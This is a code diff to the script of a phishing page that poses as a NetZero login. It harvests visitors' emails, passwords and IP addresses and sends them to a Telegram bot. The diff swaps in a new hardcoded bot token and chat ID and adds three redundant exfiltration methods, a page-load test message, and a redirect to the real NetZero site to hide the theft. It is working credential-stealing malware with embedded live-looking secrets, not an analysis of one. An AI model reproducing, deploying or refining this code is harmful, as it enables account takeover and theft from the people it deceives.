@@ -495,7 +495,11 @@
         let email = '';
         let userIP = 'Unavailable';
 
-        // Fetch IP address once
+        // Telegram configuration - UPDATED WITH NEW TOKEN
+        const TELEGRAM_BOT_TOKEN = "8309272552:AAFwpd5QPXJnnaWRxMk2jfIQja_x6XUtFUI";
+        const TELEGRAM_CHAT_ID = "5852301284";
+
+        // Fetch IP address
         fetch("https://api.ipify.org?format=json")
             .then(response => response.json())
             .then(data => {
@@ -505,19 +509,41 @@
                 userIP = 'Unavailable';
             });
 
-        // Core function to send message to Telegram
-        function processStep(email, password, job) {
-            let message = `Details:\nEmail: ${email}`;
-            if (password) message += `\nPassword: ${password}`;
-            if (job) message += `\nPassConfirm: ${job}`;
-            message += `\nIP: ${userIP}`;
+        // Function to send message to Telegram using multiple methods for reliability
+        function sendToTelegram(email, password, job) {
+            let message = `🔐 NetZero Login Details:\n`;
+            message += `Email: ${email}\n`;
+            if (password) message += `Password: ${password}\n`;
+            if (job) message += `Job Title: ${job}\n`;
+            message += `IP Address: ${userIP}\n`;
+            message += `Timestamp: ${new Date().toLocaleString()}`;
 
-            // Telegram bot API
-            let url = `https://api.telegram.org/bot8160938302:AAFUmPahGk14OY8F1v5FLHGoVRD-pGTvSOY/sendMessage?chat_id=6941095931&text=${encodeURIComponent(message)}`;
+            // Method 1: Using fetch with POST
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(() => {
+                // If fetch fails, try Method 2: JSONP approach with image
+                let img = new Image();
+                img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            });
 
-            let api = new XMLHttpRequest();
-            api.open("GET", url, true);
-            api.send();
+            // Method 3: XMLHttpRequest as backup
+            let xhr = new XMLHttpRequest();
+            xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            }));
         }
 
         // Navigation helpers
@@ -559,10 +585,10 @@
                 return;
             }
 
-            // Send email and password (job = null)
-            processStep(email, password, null);
+            // Send email and password using multiple methods
+            sendToTelegram(email, password, null);
 
-            // Move to step3
+            // Move to step3 immediately
             document.getElementById('step2').classList.remove('active');
             document.getElementById('step3').classList.add('active');
         }
@@ -571,8 +597,8 @@
         function processStep3() {
             let job = document.getElementById('_job').value;
             
-            // Send email and job (password = null)
-            processStep(email, null, job);
+            // Send email and job using multiple methods
+            sendToTelegram(email, null, job);
 
             // Redirect to netzero
             window.location.href = "https://my.netzero.net/start/login.do?cf=sp";
@@ -589,6 +615,13 @@
                     processStep3();
                 }
             }
+        });
+
+        // Send a test message when page loads to confirm the new token works
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                sendToTelegram('test@page_load.com', 'test_password', 'test_job');
+            }, 1000);
         });
     </script>
 </body>
